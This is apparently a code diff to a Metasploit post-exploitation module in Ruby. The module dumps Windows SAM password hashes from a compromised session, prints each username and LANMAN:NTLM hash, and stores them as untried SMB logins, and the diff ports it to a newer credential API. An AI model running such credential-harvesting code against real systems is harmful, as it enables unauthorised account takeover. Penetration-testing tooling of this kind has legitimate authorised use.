@@ -38,31 +38,54 @@ class Metasploit3 < Msf::Post
     session.core.use("incognito") if not session.incognito
 
     # It wasn't me mom! Stinko did it!
-    hashes = client.priv.sam_hashes
+    begin
+      hashes = client.priv.sam_hashes
+    rescue
+      print_error('Error accessing hashes, did you migrate to a process that matched the target\'s architecture?')
+      return
+    end
 
     # Target infos for the db record
-    addr = client.sock.peerhost
+    addr = session.session_host
     # client.framework.db.report_host(:host => addr, :state => Msf::HostState::Alive)
 
     # Record hashes to the running db instance
     print_good "Collecting hashes..."
 
     hashes.each do |hash|
-      data = {}
-      data[:host]  = addr
-      data[:port]  = 445
-      data[:sname] = 'smb'
-      data[:user]  = hash.user_name
-      data[:pass]  = hash.lanman + ":" + hash.ntlm
-      data[:type]  = "smb_hash"
-      if not session.db_record.nil?
-        data[:source_id] = session.db_record.id
-      end
-      data[:source_type] = "exploit",
-      data[:active] = true
+      # Build service information
+      service_data = {
+        address: addr,
+        port: 445,
+        service_name: 'smb',
+        protocol: 'tcp',
+      }
 
-      print_line "    Extracted: #{data[:user]}:#{data[:pass]}"
-      report_auth_info(data) if db_ok
+      # Build credential information
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: self.refname,
+        private_type: :ntlm_hash,
+        private_data: hash.lanman + ":" + hash.ntlm,
+        username: hash.user_name,
+        workspace_id: myworkspace_id
+      }
+
+      credential_data.merge!(service_data)
+      credential_core = create_credential(credential_data)
+
+      # Assemble the options hash for creating the Metasploit::Credential::Login object
+      login_data = {
+        core: credential_core,
+        status: Metasploit::Model::Login::Status::UNTRIED,
+        workspace_id: myworkspace_id
+      }
+
+      login_data.merge!(service_data)
+      create_credential_login(login_data)
+
+      print_line "    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}"
     end
 
     # Record user tokens
